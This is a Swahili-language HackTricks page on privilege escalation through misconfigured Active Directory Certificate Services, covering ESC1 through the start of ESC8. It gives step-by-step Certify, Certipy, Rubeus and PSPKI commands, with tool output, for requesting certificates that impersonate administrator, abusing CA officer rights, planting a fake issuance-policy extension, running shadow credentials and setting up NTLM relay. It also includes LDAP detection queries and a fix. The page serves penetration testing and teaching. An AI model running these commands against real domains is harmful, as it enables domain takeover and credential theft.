# Kuongezeka kwa Haki katika Domain ya AD CS

{{#include ../../../banners/hacktricks-training.md}}


**Huu ni muhtasari wa sehemu za mbinu za kuongeza haki kutoka kwenye machapisho:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Certificate Templates Zisizosanidiwa Vizuri - ESC1

### Maelezo

### Maelezo ya Certificate Templates Zisizosanidiwa Vizuri - ESC1

- **Haki za Enrolment zimetolewa kwa low-privileged users na Enterprise CA.**
- **Idhini ya Manager haihitajiki.**
- **Hakuna saini kutoka kwa wafanyakazi walioidhinishwa inayohitajika.**
- **Security descriptors kwenye certificate templates zina ruhusa zilizozidi, hivyo kuruhusu low-privileged users kupata haki za enrolment.**
- **Certificate templates zimesanidiwa kufafanua EKUs zinazowezesha authentication:**
- Vitambulishi vya Extended Key Usage (EKU) kama vile Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), au kutokuwa na EKU (SubCA) vimejumuishwa.
- **Uwezo wa requesters kujumuisha subjectAltName kwenye Certificate Signing Request (CSR) unaruhusiwa na template:**
- Active Directory (AD) huipa subjectAltName (SAN) katika certificate kipaumbele kwa ajili ya identity verification ikiwa ipo. Hii inamaanisha kuwa kwa kubainisha SAN katika CSR, certificate inaweza kuombwa ili kuiga mtumiaji yeyote (kwa mfano, domain administrator). Ikiwa SAN inaweza kubainishwa na requester huonyeshwa katika AD object ya certificate template kupitia property ya `mspki-certificate-name-flag`. Property hii ni bitmask, na uwepo wa flag ya `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` unaruhusu requester kubainisha SAN.

> [!CAUTION]
> Usanidi ulioelezwa unaruhusu low-privileged users kuomba certificates zenye SAN yoyote wanayochagua, na hivyo kuwezesha authentication kama domain principal yeyote kupitia Kerberos au SChannel.

Kipengele hiki wakati mwingine huwezeshwa ili kusaidia uundaji wa HTTPS au host certificates kwa wakati huo huo na products au deployment services, au kutokana na kutokuelewa kwake.

Imebainika kuwa kuunda certificate yenye chaguo hili husababisha warning, jambo ambalo halitokei wakati certificate template iliyopo (kama vile template ya `WebServer`, ambayo ina `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` ikiwa enabled) inaduplicatiwa kisha kurekebishwa ili kujumuisha authentication OID.<sup>[[6]](#references)</sup>

### Abuse

Ili **kupata certificate templates zilizo hatarini** unaweza kuendesha:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Ili **kutumia vibaya udhaifu huu na kujifanya msimamizi**, mtu anaweza kuendesha:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Kisha unaweza kubadilisha **cheti kilichozalishwa kuwa katika umbizo la `.pfx`** na kukitumia **kufanya uthibitishaji kwa kutumia Rubeus au certipy** tena:<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows binaries "Certreq.exe" na "Certutil.exe" zinaweza kutumiwa kutengeneza PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Uorodheshaji wa certificate templates ndani ya configuration schema ya AD Forest, hasa zile ambazo hazihitaji approval au signatures, zikiwa na EKU ya Client Authentication au Smart Card Logon, na zikiwa na flag ya `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` iliyowezeshwa, unaweza kufanywa kwa kuendesha LDAP query ifuatayo:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Certificate Templates Zisizosahihishwa - ESC2

### Maelezo

Hali ya pili ya abuse ni variation ya ya kwanza:

1. Enrollment rights zinatolewa kwa low-privileged users na Enterprise CA.
2. Sharti la manager approval limezimwa.
3. Hitaji la authorized signatures limeondolewa.
4. Security descriptor yenye ruhusa nyingi kupita kiasi kwenye certificate template inawapa low-privileged users certificate enrollment rights.
5. **Certificate template imefafanuliwa kujumuisha Any Purpose EKU au kutokuwa na EKU.**

**Any Purpose EKU** inaruhusu certificate kupatikana na attacker kwa **kusudi lolote**, likiwemo client authentication, server authentication, code signing, n.k. **Technique iliyotumika kwa ESC3** inaweza kutumiwa kutumia vibaya hali hii.

Certificates **zisizo na EKUs**, ambazo hufanya kazi kama subordinate CA certificates, zinaweza kutumiwa vibaya kwa **kusudi lolote** na **pia kutumika kusaini certificates mpya**. Kwa hivyo, attacker anaweza kubainisha EKUs au fields za kiholela kwenye certificates mpya kwa kutumia subordinate CA certificate.

Hata hivyo, certificates mpya zinazoundwa kwa **domain authentication** hazitafanya kazi ikiwa subordinate CA haiaminiki na object ya **`NTAuthCertificates`**, ambayo ndiyo setting ya default. Pamoja na hayo, attacker bado anaweza kuunda **certificates mpya zenye EKU yoyote** na certificate values za kiholela. Hizi zinaweza **kutumiwa vibaya** kwa madhumuni mbalimbali (kwa mfano, code signing, server authentication, n.k.) na zinaweza kuwa na athari kubwa kwa applications nyingine kwenye network kama SAML, AD FS, au IPSec.<sup>[[6]](#references)</sup>

Ili ku-enumerate templates zinazolingana na hali hii ndani ya configuration schema ya AD Forest, LDAP query ifuatayo inaweza kuendeshwa:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Violezo vya Mawakala wa Usajili Vilivyosanidiwa Vibaya - ESC3

### Maelezo

Hali hii inafanana na ya kwanza na ya pili, lakini **inatumia vibaya** **EKU tofauti** (Certificate Request Agent) na **violezo 2 tofauti** (hivyo ina seti 2 za mahitaji),

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), inayojulikana kama **Enrollment Agent** katika nyaraka za Microsoft, humruhusu principal **kujiandikisha** kwa **certificate** **kwa niaba ya mtumiaji mwingine**.

**“Enrollment agent”** hujiandikisha katika **template** kama hiyo na kutumia **certificate inayopatikana kusaini kwa pamoja CSR kwa niaba ya mtumiaji mwingine**. Kisha **hutuma** **CSR iliyosainiwa kwa pamoja** kwa CA, na kujiandikisha katika **template** inayoruhusu **“enroll on behalf of”**, na CA hujibu kwa **certificate inayomilikiwa na mtumiaji “mwingine”**.<sup>[[6]](#references)</sup>

**Mahitaji 1:**

- Haki za Enrollment zinatolewa kwa watumiaji wenye privileges ndogo na Enterprise CA.
- Sharti la idhini ya manager limeachwa.
- Hakuna sharti la signatures zilizoidhinishwa.
- Security descriptor ya certificate template ina permissive kupita kiasi, ikiwapa watumiaji wenye privileges ndogo haki za enrollment.
- Certificate template inajumuisha Certificate Request Agent EKU, ikiwezesha kuomba certificate templates nyingine kwa niaba ya principals wengine.

**Mahitaji 2:**

- Enterprise CA inawapa watumiaji wenye privileges ndogo haki za enrollment.
- Idhini ya manager inapitwa.
- Toleo la schema la template ni 1 au linazidi 2, na linabainisha Application Policy Issuance Requirement inayohitaji Certificate Request Agent EKU.
- EKU iliyofafanuliwa katika certificate template inaruhusu uthibitishaji wa domain.
- Vikwazo kwa enrollment agents havitumiki kwenye CA.

### Matumizi Mabaya

Unaweza kutumia [**Certify**](https://github.com/GhostPack/Certify) au [**Certipy**](https://github.com/ly4k/Certipy) kutumia vibaya hali hii:<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**users** ambao wanaruhusiwa **obtain** **enrollment agent certificate**, templates ambazo **agents** wanaruhusiwa kujiandikisha, na **accounts** ambazo enrollment agent anaweza kuziwakilisha zinaweza kudhibitiwa na enterprise CAs. Hili hufanywa kwa kufungua `certsrc.msc` **snap-in**, **right-clicking on the CA**, **clicking Properties**, kisha **navigating** hadi kichupo cha “Enrollment Agents”.

Hata hivyo, inabainika kuwa mpangilio wa **default** wa CAs ni “**Do not restrict enrollment agents**.” Wakati restriction ya enrollment agents inapowashwa na administrators, kwa kuiweka kuwa “Restrict enrollment agents,” configuration ya default bado inaruhusu sana. Inaruhusu **Everyone** kupata access ya kujiandikisha katika templates zote kama mtu yeyote.

## Vulnerable Certificate Template Access Control - ESC4

### **Explanation**

**security descriptor** kwenye **certificate templates** hufafanua **permissions** ambazo **AD principals** fulani wanazo kuhusiana na template.

Iwapo **attacker** ana **permissions** zinazohitajika za **alter** **template** na **institute** misconfigurations zozote zinazoweza kutumiwa kama ilivyoainishwa katika **prior sections**, privilege escalation inaweza kuwezeshwa.

Permissions muhimu zinazotumika kwa certificate templates ni pamoja na:<sup>[[6]](#references)</sup>

- **Owner:** Hutoa control ya moja kwa moja juu ya object, ikiruhusu kurekebishwa kwa attributes zote.
- **FullControl:** Huwezesha authority kamili juu ya object, ikiwemo uwezo wa kubadilisha attributes zote.
- **WriteOwner:** Huruhusu kubadilisha owner wa object kuwa principal aliye chini ya control ya attacker.
- **WriteDacl:** Huruhusu kurekebisha access controls, jambo linaloweza kumpa attacker FullControl.
- **WriteProperty:** Hutoa ruhusa ya kuhariri object properties zozote.

### Abuse

Ili kutambua principals walio na edit rights kwenye templates na PKI objects nyingine, enumerate kwa kutumia Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Mfano wa privesc kama ule uliotangulia:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 ni wakati user ana ruhusa za kuandika kwenye certificate template. Hili linaweza, kwa mfano, kutumiwa vibaya kuandika upya usanidi wa certificate template ili kuifanya template iwe vulnerable kwa ESC1.

Kama tunavyoona kwenye path iliyo hapo juu, ni `JOHNPC` pekee aliye na ruhusa hizi, lakini user wetu `JOHN` ana edge mpya ya `AddKeyCredentialLink` kuelekea `JOHNPC`. Kwa kuwa technique hii inahusiana na certificates, nimetekeleza pia attack hii, inayojulikana kama [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Huu hapa ni muhtasari mfupi wa command ya Certipy ya `shadow auto` kwa ajili ya kupata NT hash ya mwathiriwa.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** inaweza kubadilisha configuration ya certificate template kwa command moja. Kwa **chaguo-msingi**, Certipy itabadilisha configuration ili kuifanya iwe **vulnerable kwa ESC1**. Tunaweza pia kubainisha **`-save-old parameter ili kuhifadhi configuration ya zamani**, ambayo itakuwa muhimu kwa **kurejesha** configuration baada ya attack yetu.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Udhibiti wa Ufikiaji wa PKI Object Ulio Hatarini - ESC5

### Maelezo

Mtandao mpana wa mahusiano yaliyounganishwa yanayotegemea ACL, ambao unajumuisha objects kadhaa zaidi ya certificate templates na certificate authority, unaweza kuathiri usalama wa mfumo mzima wa AD CS. Objects hizi, ambazo zinaweza kuathiri sana usalama, zinajumuisha:

- AD computer object ya CA server, ambayo inaweza kuathiriwa kupitia mechanisms kama S4U2Self au S4U2Proxy.
- RPC/DCOM server ya CA server.
- AD object au container yoyote iliyo descendant ndani ya njia maalum ya container `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Njia hii inajumuisha, lakini haiishii kwenye, containers na objects kama Certificate Templates container, Certification Authorities container, NTAuthCertificates object, na Enrollment Services Container.

Usalama wa mfumo wa PKI unaweza kuathiriwa ikiwa attacker mwenye privileges za chini ataweza kupata udhibiti wa mojawapo ya vipengele hivi muhimu.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Maelezo

Mada iliyojadiliwa katika [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) pia inagusia athari za flag ya **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, kama ilivyoelezwa na Microsoft. Configuration hii, inapowashwa kwenye Certification Authority (CA), inaruhusu kuingizwa kwa **user-defined values** katika **subject alternative name** kwa **request yoyote**, ikiwemo zinazoundwa kutoka Active Directory®. Kwa hivyo, mpangilio huu unamruhusu **intruder** ku-enroll kupitia **template yoyote** iliyowekwa kwa **domain authentication**—hasa zile zinazoruhusu enrollment ya **unprivileged** users, kama User template ya kawaida. Kwa matokeo hayo, certificate inaweza kupatikana, na kumwezesha intruder ku-authenticate kama domain administrator au **active entity nyingine yoyote** ndani ya domain.<sup>[[9]](#references)</sup>

**Note**: Mbinu ya kuongeza **alternative names** kwenye Certificate Signing Request (CSR), kupitia argument ya `-attrib "SAN:"` katika `certreq.exe` (inayorejelewa kama “Name Value Pairs”), inatofautiana na exploitation strategy ya SANs katika ESC1. Tofauti hapa iko katika **jinsi account information inavyowekwa**—ndani ya certificate attribute, badala ya extension.

### Abuse

Ili kuthibitisha kama setting imewashwa, organizations zinaweza kutumia command ifuatayo pamoja na `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Operesheni hii kimsingi hutumia **remote registry access**, kwa hiyo, mbinu mbadala inaweza kuwa:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Zana kama [**Certify**](https://github.com/GhostPack/Certify) na [**Certipy**](https://github.com/ly4k/Certipy) zinaweza kugundua usanidi huu usio sahihi na kuutumia:<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Ili kubadilisha mipangilio hii, tukidhani kuwa mtu ana haki za **domain administrative** au zilizo sawa, amri ifuatayo inaweza kutekelezwa kutoka kwenye workstation yoyote:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Ili kulemaza usanidi huu katika mazingira yako, flag inaweza kuondolewa kwa:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Baada ya security updates za Mei 2022, **certificates** mpya zitakazotolewa zitakuwa na **security extension** inayojumuisha property ya `objectSid` ya **requester**. Kwa ESC1, SID hii hutokana na SAN iliyobainishwa. Hata hivyo, kwa **ESC6**, SID huakisi `objectSid` ya **requester**, si SAN.\
> Ili kutumia ESC6, ni muhimu mfumo uwe susceptible kwa ESC10 (Weak Certificate Mappings), ambayo hutanguliza **SAN** kuliko security extension mpya.

## Udhibiti wa Ufikiaji wa Certificate Authority Iliyo Hatarini - ESC7

### Shambulio la 1

#### Maelezo

Udhibiti wa ufikiaji wa certificate authority unadumishwa kupitia seti ya ruhusa zinazosimamia vitendo vya CA. Ruhusa hizi zinaweza kuonekana kwa kufungua `certsrv.msc`, kubofya CA kwa right-click, kuchagua properties, kisha kwenda kwenye kichupo cha Security. Zaidi ya hayo, ruhusa zinaweza kuorodheshwa kwa kutumia module ya PSPKI pamoja na commands kama vile:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Hii inatoa ufahamu kuhusu rights kuu, ambazo ni **`ManageCA`** na **`ManageCertificates`**, zinazohusiana na roles za “CA administrator” na “Certificate Manager” mtawalia.<sup>[[6]](#references)</sup>

#### Abuse

Kuwa na **`ManageCA`** rights kwenye certificate authority humwezesha principal kubadilisha settings kwa mbali akitumia PSPKI. Hii inajumuisha kuwasha flag ya **`EDITF_ATTRIBUTESUBJECTALTNAME2`** ili kuruhusu uainishaji wa SAN kwenye template yoyote, jambo muhimu katika domain escalation.

Mchakato huu unaweza kurahisishwa kwa kutumia cmdlet ya PSPKI ya **Enable-PolicyModuleFlag**, inayoruhusu mabadiliko kufanywa bila kuingiliana moja kwa moja na GUI.

Kuwa na **`ManageCertificates`** rights huwezesha kuidhinisha requests zinazosubiri, hivyo kukwepa ulinzi wa "CA certificate manager approval".

Mchanganyiko wa modules za **Certify** na **PSPKI** unaweza kutumika kuomba, kuidhinisha, na kupakua certificate:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### Maelezo

> [!WARNING]
> Katika **attack ya awali**, ruhusa za **`Manage CA`** zilitumika **kuwezesha** flag ya **EDITF_ATTRIBUTESUBJECTALTNAME2** ili kutekeleza **attack ya ESC6**, lakini hii haitakuwa na athari yoyote hadi huduma ya CA (`CertSvc`) ianzishwe upya. Mtumiaji anapokuwa na access right ya `Manage CA`, pia anaruhusiwa **kuanzisha upya huduma**. Hata hivyo, hii **haimaanishi kwamba mtumiaji anaweza kuanzisha upya huduma remotely**. Zaidi ya hayo, E**SC6 huenda isifanye kazi out of the box** katika mazingira mengi yaliyopatiwa patches kutokana na security updates za Mei 2022.

Kwa hiyo, attack nyingine imewasilishwa hapa.

Masharti ya awali:

- Ruhusa ya **`ManageCA`** pekee
- Ruhusa ya **`Manage Certificates`** (inaweza kutolewa kutoka **`ManageCA`**)
- Certificate template ya **`SubCA`** lazima iwe **enabled** (inaweza kuwezeshwa kutoka **`ManageCA`**)

Technique hii inategemea ukweli kwamba watumiaji walio na access right za `Manage CA` _na_ `Manage Certificates` wanaweza **ku-issue certificate requests zilizokataliwa**. Certificate template ya **`SubCA`** iko **vulnerable kwa ESC1**, lakini **administrators pekee** ndio wanaoweza ku-enroll kwenye template hiyo. Kwa hivyo, **user** anaweza **kuomba** ku-enroll kwenye **`SubCA`** - ombi ambalo **litakataliwa** - lakini **baadaye lita-issueiwa na manager**.<sup>[[6]](#references)</sup>

#### Abuse

Unaweza **kujipa mwenyewe** access right ya **`Manage Certificates`** kwa kumuongeza user wako kama officer mpya.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Kiolezo cha **`SubCA`** kinaweza **kuwezeshwa kwenye CA** kwa kutumia kigezo cha `-enable-template`. Kwa default, kiolezo cha `SubCA` kimewezeshwa.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Ikiwa tumetimiza masharti ya awali ya attack hii, tunaweza kuanza kwa **kuomba certificate kulingana na template ya `SubCA`**.

**Ombi hili litakataliwa**d, lakini tutahifadhi private key na kuandika ID ya ombi.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Kwa kutumia **`Manage CA` na `Manage Certificates`**, tunaweza kisha **kutoa ombi la certificate lililoshindikana** kwa kutumia command ya `ca` na parameter ya `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Na mwisho, tunaweza **retrieve certificate iliyotolewa** kwa kutumia command ya `req` na parameter ya `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### Maelezo

Mbali na matumizi mabaya ya kawaida ya ESC7 (kuwezesha attributes za EDITF au kuidhinisha requests zinazosubiri), **Certify 2.0** ilifichua primitive mpya kabisa inayohitaji tu role ya *Manage Certificates* (pia huitwa **Certificate Manager / Officer**) kwenye Enterprise CA.<sup>[[3]](#references)</sup>

Njia ya RPC ya `ICertAdmin::SetExtension` inaweza kutekelezwa na principal yoyote aliye na *Manage Certificates*. Ingawa njia hii kwa kawaida ilitumiwa na CAs halali kusasisha extensions kwenye requests **zinazosubiri**, attacker anaweza kuitumia vibaya **kuongeza *non-default* certificate extension** (kwa mfano OID maalum ya *Certificate Issuance Policy* kama `1.1.1.1`) kwenye request inayosubiri kuidhinishwa.

Kwa sababu template inayolengwa **haifafanui default value ya extension hiyo**, CA **HAITABADILISHA** value inayodhibitiwa na attacker wakati request itakapotolewa hatimaye. Kwa hiyo, certificate inayotokana na mchakato huu huwa na extension iliyochaguliwa na attacker ambayo inaweza:

* Kukidhi mahitaji ya Application / Issuance Policy ya templates nyingine zilizo vulnerable (na hivyo kusababisha privilege escalation).
* Kuingiza EKUs au policies za ziada zinazopa certificate trust isiyotarajiwa katika mifumo ya third-party.

Kwa ufupi, *Manage Certificates* – ambayo hapo awali ilichukuliwa kuwa sehemu “isiyo na nguvu zaidi” ya ESC7 – sasa inaweza kutumiwa kwa privilege escalation kamili au persistence ya muda mrefu, bila kugusa configuration ya CA au kuhitaji right yenye masharti makali zaidi ya *Manage CA*.

#### Kutumia primitive hii vibaya kwa Certify 2.0

1. **Tuma certificate request ambayo itabaki *pending*.** Hili linaweza kulazimishwa kwa template inayohitaji manager approval:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Ongeza extension maalum kwenye request inayosubiri** ukitumia command mpya ya `manage-ca`:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Ikiwa template tayari haifafanui extension ya *Certificate Issuance Policies*, value iliyo hapo juu itahifadhiwa baada ya issuance.*

3. **Toa request** (ikiwa role yako pia ina approval rights za *Manage Certificates*) au subiri operator aiidhinishe. Baada ya kutolewa, pakua certificate:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Certificate inayotokana na mchakato huu sasa ina issuance-policy OID hasidi na inaweza kutumiwa katika attacks zinazofuata (kwa mfano ESC13, domain escalation, n.k.).

> NOTE:  Attack hiyo hiyo inaweza kutekelezwa kwa Certipy ≥ 4.7 kupitia command ya `ca` na parameter ya `-set-extension`.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Maelezo

> [!TIP]
> Katika environments ambako **AD CS imesakinishwa**, ikiwa kuna **web enrollment endpoint vulnerable** na angalau **certificate template moja imechapishwa** inayoruhusu domain computer enrollment na client authentication (kama template ya default **`Machine`**), basi inawezekana kwa **computer yoyote yenye spooler service active kucompromise na attacker**!

AD CS inasaidia **njia kadhaa za enrollment zinazotumia HTTP**, ambazo zinapatikana kupitia server roles za ziada ambazo administrators wanaweza kusakinisha. Interfaces hizi za certificate enrollment inayotumia HTTP zinaweza kushambuliwa kwa **NTLM relay attacks**. Attacker, kutoka kwenye **machine iliyo compromised, anaweza kuigiza AD account yoyote inayothenticate kupitia inbound NTLM**. Akiwa anaigiza victim account, attacker anaweza kufikia web interfaces hizi na **kuomba client authentication certificate akitumia certificate templates za `User` au `Machine`**.

- **Web enrollment interface** (ASP application ya zamani inayopatikana kwenye `http://<caserver>/certsrv/`) kwa default hutumia HTTP pekee, ambayo haitoi ulinzi dhidi ya NTLM relay attacks. Zaidi ya hayo, inaruhusu wazi authentication ya NTLM pekee kupitia Authorization HTTP header yake, hivyo authentication methods salama zaidi kama Kerberos haziwezi kutumika.
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service, na **Network Device Enrollment Service** (NDES) kwa default zinaunga mkono negotiate authentication kupitia Authorization HTTP header yao. Negotiate authentication **inaunga mkono Kerberos na NTLM**, hivyo kumruhusu attacker **kushusha authentication hadi NTLM** wakati wa relay attacks. Ingawa web services hizi zinawezesha HTTPS kwa default, HTTPS pekee **hailindi dhidi ya NTLM relay attacks**. Ulinzi dhidi ya NTLM relay attacks kwa HTTPS services unawezekana tu HTTPS inapounganishwa na channel binding. Kwa bahati mbaya, AD CS haiwezeshi Extended Protection for Authentication kwenye IIS, ambayo inahitajika kwa channel binding.<sup>[[6]](#references)</sup>

**Tatizo** la kawaida katika NTLM relay attacks ni **muda mfupi wa NTLM sessions** na kutoweza kwa attacker kuwasiliana na services ambazo **zinahitaji NTLM signing**.

Hata hivyo, kizuizi hiki kinaondolewa kwa kutumia NTLM relay attack kupata certificate ya user, kwa sababu validity period ya certificate huamua muda wa session, na certificate inaweza kutumiwa na services ambazo **zinalazimisha NTLM signing**. Kwa maelekezo ya kutumia certificate iliyoibwa, rejelea:


{{#ref}}
account-persistence.md
{{#endref}}

Kizuizi kingine cha NTLM relay attacks ni kwamba **machine inayodhibitiwa na attacker lazima ithenticatewe na victim account**. Attacker anaweza kusubiri au kujaribu **kulazimisha** authentication hiyo:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enumerates **enabled HTTP AD CS endpoints**:<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Property ya `msPKI-Enrollment-Servers` hutumiwa na enterprise Certificate Authorities (CAs) kuhifadhi endpoints za Certificate Enrollment Service (CES). Endpoints hizi zinaweza kuchanganuliwa na kuorodheshwa kwa kutumia tool **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Matumizi mabaya kwa kutumia Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
